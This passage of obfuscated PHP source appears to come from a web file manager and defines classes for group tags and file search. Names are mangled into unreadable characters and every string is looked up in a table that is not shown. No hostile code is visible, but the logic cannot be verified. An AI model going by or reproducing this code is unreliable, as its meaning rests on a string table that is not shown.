$¡şŸøä) { $üÁâ Ç = $¡şŸøä[$ˆ¿ìİŞÄ[1705]]; $Êü˜¸ô“ = array($ˆ¿ìİŞÄ[1705] => $üÁâ Ç, $ˆ¿ìİŞÄ[1903] => $­ÇæšğÜ); $ĞáÑ á = Model($ˆ¿ìİŞÄ[1993])->where($Êü˜¸ô“)->find(); if (!$ĞáÑ á) { $©İïÅê = array($­ÇæšğÜ => $¡şŸøä[$ˆ¿ìİŞÄ[2007]]); Model($ˆ¿ìİŞÄ[577])->userGroupAdd($üÁâ Ç, $©İïÅê); } Model($ˆ¿ìİŞÄ[577])->userGroupRemove($üÁâ Ç, $Òù©İˆƒ); } $Êü˜¸ô“ = array($ˆ¿ìİŞÄ[178] => 2, $ˆ¿ìİŞÄ[180] => 0, $ˆ¿ìİŞÄ[462] => 1, $ˆ¿ìİŞÄ[548] => array($ˆ¿ìİŞÄ[7], array($Òù©İˆƒ, $­ÇæšğÜ))); $Ûì÷Ä³ = Model($ˆ¿ìİŞÄ[884])->where($Êü˜¸ô“)->field($ˆ¿ìİŞÄ[2008])->select(); $Ûì÷Ä³ = array_to_keyvalue($Ûì÷Ä³, $ˆ¿ìİŞÄ[548], $ˆ¿ìİŞÄ[181]); $‡Ÿ¡é÷û = !empty($Ûì÷Ä³[$Òù©İˆƒ]) ? $Ûì÷Ä³[$Òù©İˆƒ] : !1; if ($‡Ÿ¡é÷û) { if (!$Ûì÷Ä³[$­ÇæšğÜ]) { $Ûì÷Ä³[$­ÇæšğÜ] = Model($ˆ¿ìİŞÄ[884])->groupRootAdd($­ÇæšğÜ); } $ßÛ÷¯»Ê = $Ûì÷Ä³[$­ÇæšğÜ]; $Êü˜¸ô“ = array($ˆ¿ìİŞÄ[180] => $‡Ÿ¡é÷û); $Ûì÷Ä³ = Model($ˆ¿ìİŞÄ[884])->where($Êü˜¸ô“)->field($ˆ¿ìİŞÄ[2009])->select(); if (!$Ûì÷Ä³) { $Ûì÷Ä³ = array(); } Model($ˆ¿ìİŞÄ[884])->moveClearAuth = !1; foreach ($Ûì÷Ä³ as $õ¥òÁıŸ) { $Ğ˜Ï©‹£ = $õ¥òÁıŸ[$ˆ¿ìİŞÄ[462]] == $ˆ¿ìİŞÄ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ˆ¿ìİŞÄ[884])->move($õ¥òÁıŸ[$ˆ¿ìİŞÄ[181]], $ßÛ÷¯»Ê, $Ğ˜Ï©‹£); } Model($ˆ¿ìİŞÄ[884])->moveClearAuth = !0; $Êü˜¸ô“ = array($ˆ¿ìİŞÄ[178] => 2, $ˆ¿ìİŞÄ[548] => $Òù©İˆƒ); $‹ĞÊ¹…Û = array($ˆ¿ìİŞÄ[548] => $­ÇæšğÜ); Model($ˆ¿ìİŞÄ[2010])->where($Êü˜¸ô“)->save($‹ĞÊ¹…Û); Model($ˆ¿ìİŞÄ[2011])->where($Êü˜¸ô“)->save($‹ĞÊ¹…Û); } $this->_changeChildLevel($ğËŒ€¯‰[$Òù©İˆƒ], $ğËŒ€¯‰[$­ÇæšğÜ], !0); $this->where(array($ˆ¿ìİŞÄ[180] => $Òù©İˆƒ))->save(array($ˆ¿ìİŞÄ[180] => $­ÇæšğÜ)); $this->_clearChildrenCache($ğËŒ€¯‰[$­ÇæšğÜ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\141\166"; protected function cacheFunctionAlias($ñ¢ßâ Û) { $÷÷‚áç¾ =& $_SERVER[íû‘ş´]; return array($÷÷‚áç¾[2012] => array($ñ¢ßâ Û[0], $÷÷‚áç¾[2013]), $÷÷‚áç¾[2014] => array($ñ¢ßâ Û[0], $÷÷‚áç¾[2015])); } protected function get($¦®Œ»ÛŞ) { $ø£¼¼º =& $_SERVER[íû‘ş´]; $ğ›ÑÇ„Ù = Model($ø£¼¼º[564])->metaGet($¦®Œ»ÛŞ, $ø£¼¼º[2016]); $ëå†Æ  = json_decode($ğ›ÑÇ„Ù, !0); return $ëå†Æ  ? $ëå†Æ  : array($ø£¼¼º[2017] => $ø£¼¼º[88], $ø£¼¼º[413] => array()); } protected function set($¶·é¿öÄ, $²ŒªÇ×ß) { $òöÇóÚ =& $_SERVER[íû‘ş´]; $²ŒªÇ×ß = $²ŒªÇ×ß ? $²ŒªÇ×ß : array($òöÇóÚ[2017] => $òöÇóÚ[88], $òöÇóÚ[413] => array()); return Model($òöÇóÚ[564])->metaSet($¶·é¿öÄ, $òöÇóÚ[2016], json_encode($²ŒªÇ×ß)); } protected function getByTagID($¹ÁÊå³ğ, $Ñ‹¸’ú°) { $ÄÊó·í’ =& $_SERVER[íû‘ş´]; if (!$¹ÁÊå³ğ || !$Ñ‹¸’ú°) { return !1; } if (!Model($ÄÊó·í’[564])->getInfoSimple($¹ÁÊå³ğ)) { return !1; } $æ¼¼œœÏ = $this->get($¹ÁÊå³ğ); if (!$æ¼¼œœÏ || !isset($æ¼¼œœÏ[$ÄÊó·í’[413]])) { return !1; } $†ú¤ø¡Í = array_find_by_field($æ¼¼œœÏ[$ÄÊó·í’[413]], $ÄÊó·í’[443], $Ñ‹¸’ú°); return is_array($†ú¤ø¡Í) ? $†ú¤ø¡Í : !1; } public function listSource($¦ó”áËÒ, $ŠúƒĞ¢¶) { $øƒç…’¬ =& $_SERVER[íû‘ş´]; if ($ŠúƒĞ¢¶ && !is_array($ŠúƒĞ¢¶)) { $ŠúƒĞ¢¶ = array($ŠúƒĞ¢¶); } $»×µÉ¨ = $this->listData($¦ó”áËÒ); $×Â· = array(); foreach ($»×µÉ¨ as $’¹ÃÑ¦÷) { $Ãœ«¡û = $’¹ÃÑ¦÷[$øƒç…’¬[84]]; if (!$Ãœ«¡û) { continue; } if (!isset($×Â·[$Ãœ«¡û])) { $×Â·[$Ãœ«¡û] = array(); } $×Â·[$Ãœ«¡û][] = $’¹ÃÑ¦÷[$øƒç…’¬[477]]; } $¸ÂÔÅ¬½ = array(); foreach ($×Â· as $ÍÀáÃŒ => $øËÇ …„) { $‰ëÇ®ã… = !0; if (!$ŠúƒĞ¢¶) { $¸ÂÔÅ¬½[] = $ÍÀáÃŒ; continue; } foreach ($ŠúƒĞ¢¶ as $¬Ê¹Ì±ö) { if (!in_array($¬Ê¹Ì±ö, $øËÇ …„)) { $‰ëÇ®ã… = !1; break; } } if ($‰ëÇ®ã…) { $¸ÂÔÅ¬½[] = $ÍÀáÃŒ; } } if (!$¸ÂÔÅ¬½) { return array(); } $ê÷Ëåòî = array($øƒç…’¬[468] => array($øƒç…’¬[469], $¸ÂÔÅ¬½), $øƒç…’¬[548] => $¦ó”áËÒ, $øƒç…’¬[178] => SourceModel::TYPE_GROUP); $Ôßúı¬  = Model($øƒç…’¬[1390])->listSource($ê÷Ëåòî); if (!$Ôßúı¬  || count($¸ÂÔÅ¬½) == $Ôßúı¬ [$øƒç…’¬[410]][$øƒç…’¬[411]]) { return $Ôßúı¬ ; } $ïì¥º÷ç = array(); $àĞ”àôÄ = array_to_keyvalue($Ôßúı¬ [$øƒç…’¬[82]], $øƒç…’¬[12], $øƒç…’¬[181]); $û¡¯éù€ = array_to_keyvalue($Ôßúı¬ [$øƒç…’¬[83]], $øƒç…’¬[12], $øƒç…’¬[181]); $±èô†š› = array_merge($û¡¯éù€, $àĞ”àôÄ); foreach ($¸ÂÔÅ¬½ as $Ãœ«¡û) { if (!in_array($Ãœ«¡û, $±èô†š›)) { $ïì¥º÷ç[] = $Ãœ«¡û; } } if ($ïì¥º÷ç) { $this->removeBySource($¦ó”áËÒ, $ïì¥º÷ç); } return $Ôßúı¬ ; } protected function listData($¿ö¢ùğÉ) { $²àÔûşü =& $_SERVER[íû‘ş´]; $¢–ÌÃıú = array($²àÔûşü[1696] => 0, $²àÔûşü[535] => array($²àÔûşü[2018], 0), $²àÔûşü[473] => $²àÔûşü[2019] . $¿ö¢ùğÉ); $¸ ÷ğ›Ô = $²àÔûşü[2020]; $ÊÁ—¿·ö = $this->field($¸ ÷ğ›Ô)->where($¢–ÌÃıú)->order($²àÔûşü[2021])->select(); return $ÊÁ—¿·ö ? $ÊÁ—¿·ö : array(); } protected function addToTag($æÅ±áºô, $ú ñù…µ, $÷ÆÜ¤¬”) { $ú¡´ÇÌ =& $_SERVER[íû‘ş´]; if (!$this->getByTagID($æÅ±áºô, $÷ÆÜ¤¬”) || !$ú ñù…µ) { return !1; } if (!Model($ú¡´ÇÌ[884])->pathInfo($ú ñù…µ)) { return !1; } $ÈŞÑ¢˜ = array($ú¡´ÇÌ[1696] => 0, $ú¡´ÇÌ[535] => $÷ÆÜ¤¬”, $ú¡´ÇÌ[472] => $ú ñù…µ, $ú¡´ÇÌ[473] => $ú¡´ÇÌ[2022] . $æÅ±áºô, $ú¡´ÇÌ[471] => $ú¡´ÇÌ[12], $ú¡´ÇÌ[1907] => 0); if ($this->where($ÈŞÑ¢˜)->find()) { return !1; } return $this->add($ÈŞÑ¢˜); } protected function removeFromTag($¶¨êÜÚ, $ì†ÏÖÙ, $¾œõÁ°) { $ÒÍ¡ÛĞô =& $_SERVER[íû‘ş´]; if (!$this->getByTagID($¶¨êÜÚ, $¾œõÁ°) || !$ì†ÏÖÙ) { return !1; } if (is_array($ì†ÏÖÙ)) { $ì†ÏÖÙ = array($ÒÍ¡ÛĞô[7], $ì†ÏÖÙ); } $„ò×ê—ç = array($ÒÍ¡ÛĞô[1696] => 0, $ÒÍ¡ÛĞô[535] => $¾œõÁ°, $ÒÍ¡ÛĞô[473] => $ÒÍ¡ÛĞô[2022] . $¶¨êÜÚ, $ÒÍ¡ÛĞô[472] => $ì†ÏÖÙ); return $this->where($„ò×ê—ç)->delete(); } protected function removeByTag($±üæ‰…Ö, $Ê…ß‰Ø) { $¡’Ğ‘êİ =& $_SERVER[íû‘ş´]; if (!$this->getByTagID($±üæ‰…Ö, $Ê…ß‰Ø)) { return !1; } $Èßûåòş = array($¡’Ğ‘êİ[1696] => 0, $¡’Ğ‘êİ[535] => $Ê…ß‰Ø, $¡’Ğ‘êİ[473] => $¡’Ğ‘êİ[2022] . $±üæ‰…Ö); return $this->where($Èßûåòş)->delete(); } protected function removeBySource($ı™·Ò…Õ, $âóòá­) { $œôŸê¡‹ =& $_SERVER[íû‘ş´]; if (!$ı™·Ò…Õ || !$âóòá­) { return !1; } if (is_array($âóòá­)) { $âóòá­ = array($œôŸê¡‹[7], $âóòá­); } $¤‰¸ÏÓ = array($œôŸê¡‹[1696] => 0, $œôŸê¡‹[472] => $âóòá­, $œôŸê¡‹[535] => array($œôŸê¡‹[1072], 0), $œôŸê¡‹[473] => $œôŸê¡‹[2022] . $ı™·Ò…Õ); return $this->where($¤‰¸ÏÓ)->delete(); } } goto AÜš«šÊÒ’; e¾¤ö—¨à: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($í„¤å») { $‹°àªª =& $_SERVER[íû‘ş´]; $ØĞé‰èô = KodIO::fileTypeList(); $ÎÀİŸüÈ = $ØĞé‰èô[$í„¤å»]; if (!$ÎÀİŸüÈ) { return array(); } $ÊãÄ°ÖÑ = $ÎÀİŸüÈ[$‹°àªª[175]]; $úÏÈÑÏ = $‹°àªª[7]; if (!$ÎÀİŸüÈ[$‹°àªª[175]]) { $¬¢¶À™ = array_to_keyvalue($ØĞé‰èô, $‹°àªª[12], $‹°àªª[175]); $ÊãÄ°ÖÑ = implode($‹°àªª[50], $¬¢¶À™); $úÏÈÑÏ = $‹°àªª[2159]; } $‰Îë§€› = explode($‹°àªª[50], trim($ÊãÄ°ÖÑ, $‹°àªª[50])); return array($úÏÈÑÏ, $‰Îë§€›); } public function listPathType($ñ«µ°±›) { $ŒƒüğÅı =& $_SERVER[íû‘ş´]; $ñİÜû±Ô = $this->fileTypeWhere($ñ«µ°±›); if (!$ñİÜû±Ô) { return array(); } $Àêâ€ï = USER_ID; $¹¦Ï‚ÓÕ = Model($ŒƒüğÅı[577])->getInfo($Àêâ€ï); $Ê±ËÚºŞ = array($ŒƒüğÅı[626] => SourceModel::TYPE_USER, $ŒƒüğÅı[563] => array($ŒƒüğÅı[590], $ŒƒüğÅı[573] . $¹¦Ï‚ÓÕ[$ŒƒüğÅı[87]][$ŒƒüğÅı[181]] . $ŒƒüğÅı[591]), $ŒƒüğÅı[627] => $Àêâ€ï, $ŒƒüğÅı[624] => 0, $ŒƒüğÅı[625] => $ñİÜû±Ô); return $this->listSource($Ê±ËÚºŞ); } public function listSearch($”ªşø§¥, $Çà„âª‹ = 300) { $“³—¹‘ =& $_SERVER[íû‘ş´]; if (isset($”ªşø§¥[$“³—¹‘[1997]]) && $”ªşø§¥[$“³—¹‘[1997]]) { $”ªşø§¥[$“³—¹‘[1997]] = str_replace($“³—¹‘[428], $“³—¹‘[2160], trim($”ªşø§¥[$“³—¹‘[1997]])); } $è‡áõ‰ğ = $this->_parseSearchWhere($”ªşø§¥); if (!isset($è‡áõ‰ğ[$“³—¹‘[482]])) { $è‡áõ‰ğ[$“³—¹‘[482]] = 0; } $ÜÄ´âÏ  = $“³—¹‘[2161]; $„ŞÀ šœ = $è‡áõ‰ğ; $äîËƒ = $ÜÄ´âÏ ; $this->_listSearchBindPinyin($”ªşø§¥, $è‡áõ‰ğ, $ÜÄ´âÏ ); $this->alias($“³—¹‘[496])->_makeOrder(); $è‡áõ‰ğ = $this->parseWhereLike($è‡áõ‰ğ); $“ñÔâ«’ = $this->distinct(!0)->field($ÜÄ´âÏ )->where($è‡áõ‰ğ)->selectPage($Çà„âª‹); if ($GLOBALS[$“³—¹‘[6]][$“³—¹‘[425]][$“³—¹‘[426]] && Input::check($”ªşø§¥[$“³—¹‘[1997]], $“³—¹‘[633]) && $“ñÔâ«’[$“³—¹‘[410]][$“³—¹‘[397]] == 1 && $“ñÔâ«’[$“³—¹‘[410]][$“³—¹‘[411]] == 0) { $“ñÔâ«’ = $this->distinct(!0)->field($ÜÄ´âÏ )->where($„ŞÀ šœ)->limit(1000)->select(); $“ñÔâ«’ = array_page_split($“ñÔâ«’, !1, $Çà„âª‹); } $this->_listSearchFileContent($“ñÔâ«’, $”ªşø§¥, $äîËƒ, $„ŞÀ šœ); $this->_listSearchDesc($“ñÔâ«’, $”ªşø§¥, $äîËƒ); $this->_listSearchTag($“ñÔâ«’, $”ªşø§¥, $äîËƒ); $this->_listSearchGroupTag($“ñÔâ«’, $”ªşø§¥, $äîËƒ); $this->_listDataApply($“ñÔâ«’[$“³—¹‘[413]]); $this->_listMake($“ñÔâ«’); return $“ñÔâ«’; } private function _listSearchFileContent(&$¹»Œˆ€, $„¿×ˆĞ, $’ëñ¦Ÿ, $ä§¨§Ş) { $”ıìà„¹ =& $_SERVER[íû‘ş´]; if (!$„¿×ˆĞ[$”ıìà„¹[1997]] || $¹»Œˆ€[$”ıìà„¹[410]][$”ıìà„¹[397]] > 1) { return; } if (!isset($ä§¨§Ş[$”ıìà„¹[32]]) || !is_array($„¿×ˆĞ[$”ıìà„¹[518]])) { return; } $ä§¨§Ş[$”ıìà„¹[518]] = array($”ıìà„¹[7], $„¿×ˆĞ[$”ıìà„¹[518]]); unset($ä§¨§Ş[$”ıìà„¹[32]]); unset($„¿×ˆĞ[$”ıìà„¹[518]]); $ç¼¼­Ï = $this->field($’ëñ¦Ÿ)->where($ä§¨§Ş)->limit($”ıìà„¹[2162])->select(); if (!$ç¼¼­Ï || count($ç¼¼­Ï) == 0) { return; } $¹»Œˆ€[$”ıìà„¹[413]] = array_merge($ç¼¼­Ï, $¹»Œˆ€[$”ıìà„¹[413]]); $¹»Œˆ€[$”ıìà„¹[410]][$”ıìà„¹[411]] += count($ç¼¼­Ï); } private function _listSearchTag(&$ı´³…“, $Ì«‘Ó, $×áÏÂ‘—) { $×¹Ä¾ =& $_SERVER[íû‘ş´]; if (!$Ì«‘Ó[$×¹Ä¾[1997]] || $ı´³…“[$×¹Ä¾[410]][$×¹Ä¾[397]] > 1) { return; } $ö‹ÅĞ“¦ = Model($×¹Ä¾[2163])->listData(); $’ß¢·àÎ = array(); $ë¼±÷şŸ = $Ì«‘Ó[$×¹Ä¾[1997]]; foreach ($ö‹ÅĞ“¦ as $ìÕæ—Ø¦) { $ÖåŠ³ùö = $ìÕæ—Ø¦[$×¹Ä¾[32]]; $ö’üÆˆ = str_replace($×¹Ä¾[53], $×¹Ä¾[12], Pinyin::get($ÖåŠ³ùö)); if (stripos($ÖåŠ³ùö, $ë¼±÷şŸ) !== !1 || stripos($ö’üÆˆ, $ë¼±÷şŸ) !== !1) { $’ß¢·àÎ[] = $ìÕæ—Ø¦[$×¹Ä¾[443]]; } } if (!$’ß¢·àÎ) { return; } $Çæñê¡¶ = array($×¹Ä¾[477] => array($×¹Ä¾[7], $’ß¢·àÎ), $×¹Ä¾[1705] => USER_ID); $÷µÕ˜“ò = Model($×¹Ä¾[479])->field($×¹Ä¾[84])->where($Çæñê¡¶)->select(); $÷µÕ˜“ò = array_to_keyvalue($÷µÕ˜“ò, $×¹Ä¾[12], $×¹Ä¾[84]); $§–ÙÕßÄ = array_unique($÷µÕ˜“ò); $this->_listSearchMerge($ı´³…“, $Ì«‘Ó, $×áÏÂ‘—, $§–ÙÕßÄ); } private function _listSearchDesc(&$úÜÎİ, $…óëÀŸû, $•®ˆ¡ª) { $ÛÛ¸Ã =& $_SERVER[íû‘ş´]; if (!$…óëÀŸû[$ÛÛ¸Ã[1997]] || $úÜÎİ[$ÛÛ¸Ã[410]][$ÛÛ¸Ã[397]] > 1) { return; } $ï²œÑ‰ü = array($ÛÛ¸Ã[94] => $ÛÛ¸Ã[503], $ÛÛ¸Ã[418] => array($ÛÛ¸Ã[427], $ÛÛ¸Ã[1999] . $…óëÀŸû[$ÛÛ¸Ã[1997]] . $ÛÛ¸Ã[1999])); $·µıšƒã = !1; if ($·µıšƒã) { $ØÙ¾¾ãˆ = $this->listSearchChildren($…óëÀŸû[$ÛÛ¸Ã[180]]); $ØÙ¾¾ãˆ = array_unique($ØÙ¾¾ãˆ); if (!$ØÙ¾¾ãˆ) { return; } $ï²œÑ‰ü[$ÛÛ¸Ã[181]] = array($ÛÛ¸Ã[7], $ØÙ¾¾ãˆ); } $ï·ÏŸ©å = Model($ÛÛ¸Ã[610])->field($ÛÛ¸Ã[181])->where($ï²œÑ‰ü)->limit(5000)->select(); $û‰µØÁ = array_to_keyvalue($ï·ÏŸ©å, $ÛÛ¸Ã[12], $ÛÛ¸Ã[181]); $this->_listSearchMerge($úÜÎİ, $…óëÀŸû, $•®ˆ¡ª, $û‰µØÁ); } private function _listSearchGroupTag(&$¿“î¾î, $›ıÖü¸, $¢š˜¥ğĞ) { $î¦®½ =& $_SERVER[íû‘ş´]; if (!$›ıÖü¸[$î¦®½[1997]] || $¿“î¾î[$î¦®½[410]][$î¦®½[397]] > 1 || !$›ıÖü¸[$î¦®½[180]]) { return; } $ô‹ÌîŠ = $this->sourceInfo($›ıÖü¸[$î¦®½[180]]); if (!$ô‹ÌîŠ || $ô‹ÌîŠ[$î¦®½[178]] != SourceModel::TYPE_GROUP) { return; } $¼†›µØ¦ = $ô‹ÌîŠ[$î¦®½[548]]; $—ğŠûò€ = Model($î¦®½[2164])->get($¼†›µØ¦); $ş¢˜Şà = array(); $æÏ´•Ò = $›ıÖü¸[$î¦®½[1997]]; foreach ($—ğŠûò€[$î¦®½[413]] as $½à¿äÊ) { $†ß„ÚÔ· = $½à¿äÊ[$î¦®½[32]]; $²Ø€÷Ùš = str_replace($î¦®½[53], $î¦®½[12], Pinyin::get($†ß„ÚÔ·)); if (stripos($†ß„ÚÔ·, $æÏ´•Ò) !== !1 || stripos($²Ø€÷Ùš, $æÏ´•Ò) !== !1) { $ş¢˜Şà[] = $½à¿äÊ[$î¦®½[443]]; } } if (!$ş¢˜Şà) { return; } $¦Ìı“ğé = array($î¦®½[477] => array($î¦®½[7], $ş¢˜Şà), $î¦®½[1705] => 0, $î¦®½[33] => $î¦®½[2019] . $¼†›µØ¦); $ëªªõãú = Model($î¦®½[479])->field($î¦®½[84])->where($¦Ìı“ğé)->select(); $ëªªõãú = array_to_keyvalue($ëªªõãú, $î¦®½[12], $î¦®½[84]); $à•Ìà™½ = array_unique($ëªªõãú); $this->_listSearchMerge($¿“î¾î, $›ıÖü¸, $¢š˜¥ğĞ, $à•Ìà™½); } private function _listSearchMerge(&$·åÀôğß, $ò¿µ¸Óª, $óëïÂß, $›ğæ„°¨) { $û¿ÌÉƒ• =& $_SERVER[íû‘ş´]; if (!$›ğæ„°¨) { return; } $Í¨œ°»± = array_to_keyvalue($·åÀôğß[$û¿ÌÉƒ•[413]], $û¿ÌÉƒ•[12], $û¿ÌÉƒ•[181]); $¾÷ÑÎÅ = array_diff($›ğæ„°¨, $Í¨œ°»±); if (!$¾÷ÑÎÅ) { return; } $Ò›Å€Šú = array($û¿ÌÉƒ•[181] => array($û¿ÌÉƒ•[7], $¾÷ÑÎÅ)); $Ş“„Ò£ = $this->field($óëïÂß)->where($Ò›Å€Šú)->select(); if (!$Ş“„Ò£) { return; } $é­‰†¢ä = array(); foreach ($Ş“„Ò£ as $»§†­ ) { if ($this->_listSearchFilter($»§†­ , $ò¿µ¸Óª)) { $é­‰†¢ä[] = $»§†­ ; } } $·åÀôğß[$û¿ÌÉƒ•[413]] = array_merge($é­‰†¢ä, $·åÀôğß[$û¿ÌÉƒ•[413]]); $·åÀôğß[$û¿ÌÉƒ•[410]][$û¿ÌÉƒ•[411]] += count($é­‰†¢ä); } private function _listSearchFilter($†ËÎïğ, $‚ë’á«ô) { $¬Š˜Î– =& $_SERVER[íû‘ş´]; $é¿¨¢ß› = $†ËÎïğ[$¬Š˜Î–[462]] == $¬Š˜Î–[88]; if (!strstr($†ËÎïğ[$¬Š˜Î–[563]], $¬Š˜Î–[50] . $‚ë’á«ô[$¬Š˜Î–[180]] . $¬Š˜Î–[50])) { return !1; } if (isset($‚ë’á«ô[$¬Š˜Î–[463]]) && $‚ë’á«ô[$¬Š˜Î–[463]] != $¬Š˜Î–[1958]) { if ($‚ë’á«ô[$¬Š˜Î–[463]] == $¬Š˜Î–[75] && !$é¿¨¢ß›) { return !1; } if ($‚ë’á«ô[$¬Š˜Î–[463]] != $¬Š˜Î–[75] && $é¿¨¢ß›) { return !1; } if (!strstr($†ËÎïğ[$¬Š˜Î–[175]], $¬Š˜Î–[50] . $‚ë’á«ô[$¬Š˜Î–[463]] . $¬Š˜Î–[50])) { return !1; } } if (isset($‚ë’á«ô[$¬Š˜Î–[2165]]) && $‚ë’á«ô[$¬Š˜Î–[2165]] < $†ËÎïğ[$¬Š˜Î–[76]]) { return !1; } if (isset($‚ë’á«ô[$¬Š˜Î–[2166]]) && $‚ë’á«ô[$¬Š˜Î–[2166]] > $†ËÎïğ[$¬Š˜Î–[76]]) { return !1; } if (isset($‚ë’á«ô[$¬Š˜Î–[640]]) && $‚ë’á«ô[$¬Š˜Î–[640]] != $†ËÎïğ[$¬Š˜Î–[506]]) { return !1; } return !0; } public function listSearchChildren($ÁÂƒ¿¯, $¶ÉàÁˆú = 5000) { $ˆœéÛâÌ =& $_SERVER[íû‘ş´]; $üıÑÛí‰ = array(); $ŞôÃ™òë = $this->sourceInfo($ÁÂƒ¿¯); $àÌÏ‚ì» = array($ˆœéÛâÌ[563] => array($ˆœéÛâÌ[427], $ŞôÃ™òë[$ˆœéÛâÌ[563]] . $ŞôÃ™òë[$ˆœéÛâÌ[181]] . $ˆœéÛâÌ[591])); $ƒàëöşË = $this->field($ˆœéÛâÌ[76])->where($àÌÏ‚ì»)->limit($¶ÉàÁˆú + 1)->select(); $ÃêÜÙ´† = is_array($ƒàëöşË) ? count($ƒàëöşË) : 0; if ($ÃêÜÙ´† > $¶ÉàÁˆú) { return $this->_listSearchChildrenNear($ÁÂƒ¿¯, $¶ÉàÁˆú); } $¬Ç­ÆÜÕ = $this->field($ˆœéÛâÌ[181])->where($àÌÏ‚ì»)->select(); $üıÑÛí‰ = array_to_keyvalue($¬Ç­ÆÜÕ, $ˆœéÛâÌ[12], $ˆœéÛâÌ[181]); return $üıÑÛí‰; } private function _listSearchChildrenNear($•ù¸éµ, $Îî£Àª) { $ØĞÕı³• =& $_SERVER[íû‘ş´]; $èø¥•Ï = array(); $ƒÔ‹ò´Š = array($ØĞÕı³•[180] => $•ù¸éµ); $¡ÏæŒ¦ = $this->field($ØĞÕı³•[2167])->where($ƒÔ‹ò´Š)->select(); $±èğÃìÖ = array_to_keyvalue(array_filter_by_field($¡ÏæŒ¦, $ØĞÕı³•[462], $ØĞÕı³•[88]), $ØĞÕı³•[12], $ØĞÕı³•[181]); $èø¥•Ï = array_merge($èø¥•Ï, array_to_keyvalue($¡ÏæŒ¦, $ØĞÕı³•[12], $ØĞÕı³•[181])); if (!$±èğÃìÖ) { return $èø¥•Ï; } $ƒÔ‹ò´Š = array($ØĞÕı³•[180] => array($ØĞÕı³•[7], $±èğÃìÖ)); $¡ÏæŒ¦ = $this->field($ØĞÕı³•[2167])->where($ƒÔ‹ò´Š)->limit($Îî£Àª)->select(); $èø¥•Ï = array_merge($èø¥•Ï, array_to_keyvalue($¡ÏæŒ¦, $ØĞÕı³•[12], $ØĞÕı³•[181])); $èø¥•Ï = array_slice($èø¥•Ï, 0, $Îî£Àª); return $èø¥•Ï; } private function _listSearchBindPinyin($ ôœÔ¬ä, &$÷Ã±Ä»Ë, &$öİÁ®åæ) { $šÀĞÅÏÊ =& $_SERVER[íû‘ş´]; if (!isset($ ôœÔ¬ä[$šÀĞÅÏÊ[1997]]) || !$ ôœÔ¬ä[$šÀĞÅÏÊ[1997]]) { return; } if (!Input::check($ ôœÔ¬ä[$šÀĞÅÏÊ[1997]], $šÀĞÅÏÊ[362]) || strlen($ ôœÔ¬ä[$šÀĞÅÏÊ[1997]]) < 2) { return; } $ŠƒÊøÎ = "\114\105\106\x54\40\112\x4f\x49\x4e\40{$this->tablePrefix}\151\x6f\137\x73\157\x75\162\143\x65\137\155\x65\164\x61\40\155\x65\x74\x61\x20\157\x6e\40\163\x6f\165\x72\143\x65\56\x73\157\x75\162\143\145\111\104\40\75\40\x6d\x65\164\x61\56\x73\157\165\162\143\145\x49\x44"; $Öı÷›‡ = array(); $öİÁ®åæ = str_replace(array($šÀĞÅÏÊ[246], $šÀĞÅÏÊ[53], $šÀĞÅÏÊ[2168]), $šÀĞÅÏÊ[12], $öİÁ®åæ); $öİÁ®åæ = $šÀĞÅÏÊ[488] . str_replace($šÀĞÅÏÊ[50], $šÀĞÅÏÊ[489], $öİÁ®åæ); $¦…¶¼ = $÷Ã±Ä»Ë[$šÀĞÅÏÊ[32]]; unset($÷Ã±Ä»Ë[$šÀĞÅÏÊ[32]]); foreach ($÷Ã±Ä»Ë as $ŠÀ€» => $ÏÂà‡ªö) { $Öı÷›‡[$šÀĞÅÏÊ[488] . $ŠÀ€»] = $ÏÂà‡ªö; } foreach ($¦…¶¼ as $”»ó‡×) { $Öı÷›‡[] = array($šÀĞÅÏÊ[493] => $”»ó‡×, $šÀĞÅÏÊ[1058] => $šÀĞÅÏÊ[2001], array($šÀĞÅÏÊ[2169] => $”»ó‡×, $šÀĞÅÏÊ[2170] => array($šÀĞÅÏÊ[7], array($šÀĞÅÏÊ[515], $šÀĞÅÏÊ[514])))); } $this->join($ŠƒÊøÎ); $÷Ã±Ä»Ë = $Öı÷›‡; } private function _parseSearchWhere($âôñ®š­) { $©ÁßñÔ =& $_SERVER[íû‘ş´]; $ä×Áü‡§ = array(); if (isset($âôñ®š­[$©ÁßñÔ[819]]) && $âôñ®š­[$©ÁßñÔ[819]]) { $ä×Áü‡§[$©ÁßñÔ[85]] = array($©ÁßñÔ[2171], $âôñ®š­[$©ÁßñÔ[819]]); } if (isset($âôñ®š­[$©ÁßñÔ[820]]) && $âôñ®š­[$©ÁßñÔ[820]]) { $Ùë‹ˆÀã = array($©ÁßñÔ[2172], $âôñ®š­[$©ÁßñÔ[820]]); if ($ä×Áü‡§[$©ÁßñÔ[85]]) { $ä×Áü‡§[$©ÁßñÔ[85]] = array($ä×Áü‡§[$©ÁßñÔ[85]], $Ùë‹ˆÀã, $©ÁßñÔ[2173]); } else { $ä×Áü‡§[$©ÁßñÔ[85]] = $Ùë‹ˆÀã; } } if (isset($âôñ®š­[$©ÁßñÔ[2165]]) && $âôñ®š­[$©ÁßñÔ[2165]] > 0) { $ä×Áü‡§[$©ÁßñÔ[76]] = array($©ÁßñÔ[2171], $âôñ®š­[$©ÁßñÔ[2165]]); } if (isset($âôñ®š­[$©ÁßñÔ[2166]]) && $âôñ®š­[$©ÁßñÔ[2166]]) { $Ùë‹ˆÀã = array($©ÁßñÔ[2172], $âôñ®š­[$©ÁßñÔ[2166]]); if ($ä×Áü‡§[$©ÁßñÔ[76]]) { $ä×Áü‡§[$©ÁßñÔ[76]] = array($ä×Áü‡§[$©ÁßñÔ[76]], $Ùë‹ˆÀã, $©ÁßñÔ[2173]); } else { $ä×Áü‡§[$©ÁßñÔ[76]] = $Ùë‹ˆÀã; } } if (isset($âôñ®š­[$©ÁßñÔ[640]]) && $âôñ®š­[$©ÁßñÔ[640]]) { $ä×Áü‡§[] = array($©ÁßñÔ[506] => $âôñ®š­[$©ÁßñÔ[640]], $©ÁßñÔ[504] => $âôñ®š­[$©ÁßñÔ[640]], $©ÁßñÔ[1058] => $©ÁßñÔ[2001]); } if (isset($âôñ®š­[$©ÁßñÔ[463]]) && $âôñ®š­[$©ÁßñÔ[463]]) { $À÷ãè‹µ = $âôñ®š­[$©ÁßñÔ[463]]; if ($À÷ãè‹µ == $©ÁßñÔ[75]) { $ä×Áü‡§[$©ÁßñÔ[462]] = 1; } else { if ($À÷ãè‹µ == $©ÁßñÔ[2174]) { 